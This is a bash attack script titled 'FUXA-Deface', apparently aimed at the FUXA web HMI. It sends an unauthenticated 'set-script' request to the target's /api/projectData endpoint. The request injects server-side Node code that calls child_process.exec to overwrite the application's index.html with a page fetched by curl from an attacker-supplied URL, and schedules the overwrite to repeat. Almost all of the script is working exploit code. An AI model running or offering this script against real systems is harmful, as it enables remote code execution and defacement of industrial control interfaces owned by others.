#!/bin/bash
# Title: FUXA-Deface
# Author: Jesse Cutshall (@kiddcutty)
# Description: Web defacement script for FUXA instance.


echo " @@@@@@@@ @@@  @@@ @@@  @@@  @@@@@@       @@@@@@@  @@@@@@@@ @@@@@@@@  @@@@@@   @@@@@@@ @@@@@@@@";
echo " @@!      @@!  @@@ @@!  !@@ @@!  @@@      @@!  @@@ @@!      @@!      @@!  @@@ !@@      @@!     ";
echo " @!!!:!   @!@  !@!  !@@!@!  @!@!@!@!      @!@  !@! @!!!:!   @!!!:!   @!@!@!@! !@!      @!!!:!  ";
echo " !!:      !!:  !!!  !: :!!  !!:  !!!      !!:  !!! !!:      !!:      !!:  !!! :!!      !!:     ";
echo "  :        :.:: :  :::  :::  :   : :      :: :  :  : :: :::  :        :   : :  :: :: : : :: :::";
echo "                                                                                               ";


read -p "Enter target URL (e.g. http://192.18.48.50:1881): " TARGET_URL
read -p "Enter attacker URL (e.g. http://192.168.10.10:8000/deface.html: " ATTKR_URL


data="$(cat <<EOF
{
  "cmd": "set-script",
  "data": {
    "id": "s_4cd9ba2d-4a4c4d2d",
    "name": "download_overwrite",
    "sync": false,
    "parameters": [],
    "mode": "SERVER",
    "code": "require('child_process').exec('chmod +w /usr/src/app/FUXA/client/dist/index.html; curl $ATTKR_URL > /usr/src/app/FUXA/client/dist/index.html')",
    "scheduling": {
      "mode": "interval",
      "interval": 86000,
      "schedules": []
    },
    "permission": 128,
    "permissionRoles": {
      "enabled": null
    }
  }
}
EOF
)"

curl -X POST "$TARGET_URL/api/projectData" \
  -H "Content-Type: application/json" \
  --data-binary "$data"

